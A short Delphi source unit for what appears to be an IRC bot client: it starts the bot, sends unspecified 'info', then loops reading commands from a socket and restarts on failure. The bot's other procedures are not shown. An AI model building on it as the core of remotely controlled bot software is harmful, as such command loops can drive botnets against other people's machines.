   unit irc;

   interface

   uses windows,winsock, main;

   procedure mirc;

   implementation

   procedure mirc;
   begin
    StartUp;  //Starts bot
    SendInfo; //Sends Info
   while True do
    begin
     if (recv(Sock1,buff,SizeOf(buff),0)) < 1 then  // Trys to read from socket if
      begin                                         // the Recv() comes out to be

       Restart;                                     // then it will restart. If not
      end else                                      // then does the ReadSock procedure.
       begin
        ReadSock;
       end;
     end;
   end;

   end.
